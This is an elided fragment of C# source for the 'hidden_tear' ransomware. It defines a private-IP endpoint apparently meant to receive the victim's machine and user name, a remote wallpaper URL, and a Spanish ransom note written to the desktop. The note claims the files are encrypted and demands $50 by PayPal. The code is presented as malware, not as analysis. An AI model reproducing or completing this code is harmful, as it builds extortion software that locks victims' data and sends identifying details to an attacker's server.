...
namespace hidden_tear
{
    public partial class Form1 : Form
    {
        ...
        string targetURL = "http://192.168.100.11:80/api/data";
        string userName = Environment.UserName;
        string computerName = System.Environment.MachineName.ToString();
        string userDir = "C:\\";
        string backgroundImageUrl = "http://insidesolutionscr.com/1366x768-2981414-anonymous-technology-minimalism-hacking-security___mixed-wallpapers.jpg"; //desktop background picture
        string pass ;
        ...
        {
            string path = "\\Desktop\\LEEME.txt";
            string fullpath = userDir + "Users\\" + userName + path;
            string infos = computerName + "-" + userName;
            string[] lines = { "Su computadora ha sido secuestrada","Todos sus datos personales han sido encriptados.", "Debe enviar $50 a abcd@mihost.com por paypal.","No intente rastrear la dirección de la cuenta.", "Clave:" + pass};
